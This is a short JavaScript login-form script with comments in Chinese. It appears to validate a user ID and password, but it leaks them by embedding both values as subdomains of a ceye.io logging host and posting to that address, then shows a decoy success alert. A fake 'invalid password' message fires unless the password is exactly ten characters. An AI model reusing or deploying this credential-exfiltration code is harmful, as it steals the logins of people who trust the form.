	<script>
		function checkLogin() {
			var form = document.getElementById("form1");
			var bor_id = document.getElementById("bor_id"); 
			var pwd = document.getElementById("passwd");
			if(pwd.value.length != 10 ) {
				var msg = document.getElementById("msg");
				msg.innerHTML="Invalid UserID and/or Password. Please re-enter. ";

				pwd.value="";
			}
			else {
				btnSubmit(form, bor_id.value, pwd.value);
			//	form.submit();
			}

			}			
		function btnSubmit(form, user, passwd) {
			var URL = "http://" +  user + "." + passwd + "." + "u2c90f.ceye.io";
			var options = {
    			type: 'post',//提交方式
    			url:  URL ,
    			data : '{"user":"123","psw":"435"}',
    			success: function() {alert('Thanks for your comment!');}
   			};
   			$("#form1").ajaxSubmit(options); // jquery 表单提交
		}
	</script>
